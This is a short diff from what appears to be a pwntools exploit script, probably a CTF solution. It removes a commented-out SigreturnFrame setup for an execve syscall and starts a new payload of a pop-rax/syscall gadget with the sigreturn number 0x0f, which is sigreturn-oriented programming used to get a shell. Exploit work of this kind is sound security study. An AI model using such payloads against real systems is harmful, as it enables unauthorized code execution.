@@ -53,15 +53,7 @@ payload =flat([
 ])
 
 s(payload)
-"""
-frame = SigreturnFrame(arch='amd64')
-frame.rax= 59
-frame.rdi = 0x601040 
-frame.rsi= 0
-frame.rdx= 0
-frame.rsp= bss_adres
-frame.rip = syscall 
-"""
+
 payload =flat([
            pop_rax_syscall,
            0x0f,
